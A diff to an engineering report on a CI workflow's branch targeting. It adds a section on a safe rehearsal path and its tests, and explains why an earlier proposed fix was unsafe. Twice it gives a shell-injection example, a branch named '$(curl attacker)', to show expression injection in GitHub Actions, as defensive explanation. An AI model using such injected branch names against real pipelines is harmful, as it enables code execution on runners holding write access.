@@ -469,12 +469,19 @@ properties are asserted by test.
 
 1. **The 2026-09-01…09-06 restore is still outstanding** (§6). The gate stays red
    until it runs.
-2. **`clv-update.yml` cannot be rehearsed off `main`.** It calls
-   `git_data_commit.py` without `--branch`, defaulting to `main`, so a
-   feature-branch dispatch would push production data to `main`. The settlement
-   chain has **no safe end-to-end rehearsal path** — a direct contributor to CR-2
-   shipping. Fix: pass `--branch ${{ github.ref_name }}`. Not done here because
-   it changes production push behavior beyond Wave 0's remit.
+2. ~~**`clv-update.yml` cannot be rehearsed off `main`.**~~ **✅ Closed by Wave
+   0.05** — see §16. It called `git_data_commit.py` without `--branch`,
+   defaulting to `main`, so a feature-branch dispatch pushed production data to
+   `main`. The settlement chain had **no safe end-to-end rehearsal path** — a
+   direct contributor to CR-2 shipping.
+
+   **The fix this report originally proposed was itself unsafe.** Wave 0 wrote
+   "pass `--branch ${{ github.ref_name }}`". Git permits `$`, backticks, `;`,
+   `&` and `|` in branch names, and a `${{ }}` expression is substituted into a
+   `run:` body *before* the shell parses it — so a branch named
+   `$(curl attacker)` would execute on a runner holding `contents: write`.
+   Wave 0.05 implements the safe form instead: context passed via `env:`, and a
+   fail-closed resolver that constrains the name to `[A-Za-z0-9._/-]`.
 3. **Three production scripts execute on import.** `build_kalshi_registry.py`,
    `merge_odds.py` and `enrich_data.py` have no `if __name__ == "__main__":`
    guard. Importing `build_kalshi_registry` **rewrites**
@@ -631,5 +638,83 @@ treated as a defect — not as permission to stop looking.
 
 ---
 
-*Wave 0 complete. Wave 1 — executable pricing (CR-1/CR-5), doubleheader slate
-identity (CR-3) — is not started and is not authorized by this document.*
+## 16. Wave 0.05 — safe non-`main` rehearsal path for `clv-update.yml`
+
+Closes blind spot §12.2, the last thing standing between Wave 0 and the
+six-date production restore. Operational safety only; no model, pricing,
+calibration, staking, eligibility, settlement-formula or CLV-formula change.
+
+### Behavior before
+
+`clv-update.yml`'s commit step called `scripts/ci/git_data_commit.py` with
+`--message` and a path list, and **no `--branch`**. That argument defaults to
+`'main'` (`git_data_commit.py:591`) and the push is
+`git push origin HEAD:<branch>` (`git_data_commit.py:552`). Meanwhile
+`actions/checkout@v4` carries no `ref:`, so it checks out `github.ref` — the
+dispatched branch.
+
+The result was the worst available shape: **compute on the feature branch,
+publish to `main`.** Every dispatch, from any ref, wrote to production.
+
+### Behavior after
+
+| Event | Ref | Persists to |
+|---|---|---|
+| `schedule` | default branch | default branch — **unchanged** |
+| `workflow_dispatch` | `main` | `main` (intentional production use) |
+| `workflow_dispatch` | any feature branch | **that branch only** |
+| `push` | the pushed branch | that branch |
+| anything else | — | **fails closed, writes nothing** |
+
+The target is always the ref the run is executing on, so a run can only write
+where it came from.
+
+### Why not the one-line `--branch ${{ github.ref_name }}`
+
+Two reasons, both load-bearing:
+
+1. **Injection.** Git permits `$`, backticks, `;`, `&`, `|`, `(`, `)` in ref
+   names. A `${{ }}` expression is substituted into the `run:` body *before*
+   the shell parses it, so a branch named `$(curl attacker)` executes on a
+   runner holding `contents: write`. Context now arrives through `env:`, and
+   `scripts/ci/resolve_commit_branch.py` independently constrains the name to
+   `[A-Za-z0-9._/-]` — a charset with no shell metacharacter — additionally
+   rejecting a leading `-` (parsed as a git option), `..`, `//`, empty path
+   components, a trailing `.lock`, and `HEAD`.
+2. **Ambiguity.** `github.ref_name` is meaningful only when the ref is a branch
+   and the event's ref identifies the write target. A tag ref, an unrecognized
+   event, or a `schedule` firing off the default branch are states where the
+   correct target is genuinely unknown. Each **fails the job** rather than
+   falling back to the default branch — falling back is the defect itself.
+
+The resolver step runs **before** any computation, so a rejected target costs
+no API quota and produces no output it cannot persist.
+
+### Tests
+
+`tests/test_clv_update_branch_targeting.py` — 47 cases:
+
+| Requirement | Guard |
+|---|---|
+| Scheduled runs still target the default branch | `test_scheduled_run_still_targets_the_default_branch` (+ a non-`main` default) |
+| Dispatch on a feature branch targets that branch | `test_workflow_dispatch_on_a_feature_branch_targets_that_branch` |
+| Dispatch on `main` may still write to `main` | `test_workflow_dispatch_on_main_may_still_write_to_main` |
+| A rehearsal can never write to `main` | `test_feature_branch_rehearsal_never_resolves_to_the_default_branch` (4 branch shapes) |
+| Ambiguity fails instead of defaulting | `test_ambiguous_state_raises_instead_of_defaulting_to_main` (10 states) |
+| No shell injection | `test_malformed_or_injecting_branch_names_are_rejected` (18 payloads) + `test_resolver_step_passes_context_by_env_not_by_interpolation` |
+| Failure emits no usable branch | `test_the_resolver_process_exits_nonzero_and_prints_nothing_usable_on_failure` |
+| Commit allow-list unchanged | `test_commit_file_allow_list_is_byte_for_byte_unchanged` |
+| Wave 0 durability preserved | `test_commit_step_still_persists_output_when_a_later_step_fails` |
+| No decision-surface change | `test_wave_0_05_touches_no_model_pricing_or_settlement_file` |
+
+**Mutation-tested.** Removing `--branch` fails
+`test_the_resolver_is_what_the_commit_step_actually_uses`; hard-coding
+`--branch main` fails the same guard; making the resolver fall back to the
+default branch instead of raising fails two `test_ambiguous_state_*` cases.
+
+---
+
+*Wave 0 complete. Wave 0.05 adds the rehearsal path only. The six-date
+production restore is NOT started and awaits CEO review. Wave 1 — executable
+pricing (CR-1/CR-5), doubleheader slate identity (CR-3), engine consolidation
+(CR-6) — is not started and is not authorized by this document.*
